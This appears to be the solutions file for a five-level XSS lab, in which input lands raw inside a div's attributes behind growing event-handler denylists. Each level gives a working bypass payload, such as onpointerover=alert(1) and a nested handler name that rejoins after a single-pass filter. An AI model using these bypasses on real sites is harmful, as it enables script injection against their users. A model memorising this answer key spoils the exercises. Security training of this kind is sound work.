# eventhandler — solutions

Reflection injected directly into a `<div>` tag's attribute area (`<div QUERY>`), with `<` and `>` stripped and progressively stronger event-handler denylists.

### eventhandler-xss-level1

`/eventhandler/level1/?query=onpointerover=alert(1)`

- payload: `onpointerover=alert(1)`
- context: raw attribute injection in `<div>`; only angle brackets stripped

### eventhandler-xss-level2

`/eventhandler/level2/?query=onpointerover=alert(1)`

- payload: `onpointerover=alert(1)`
- context: filter strips `on(error|load|click)` only

### eventhandler-xss-level3

`/eventhandler/level3/?query=onpointerover=alert(1)`

- payload: `onpointerover=alert(1)`
- context: extra mouse/key handlers filtered; `onpointerover` not in regex

### eventhandler-xss-level4

`/eventhandler/level4/?query=onpointerover=alert(1)`

- payload: `onpointerover=alert(1)`
- context: drag/animation handlers + `javascript:` filtered; pointer events still ok

### eventhandler-xss-level5

`/eventhandler/level5/?query=x%20ononmouseovermouseover=alert(1)%20x`

- payload: `x ononmouseovermouseover=alert(1) x`
- context: single-pass handler denylist; nest the name so it rejoins
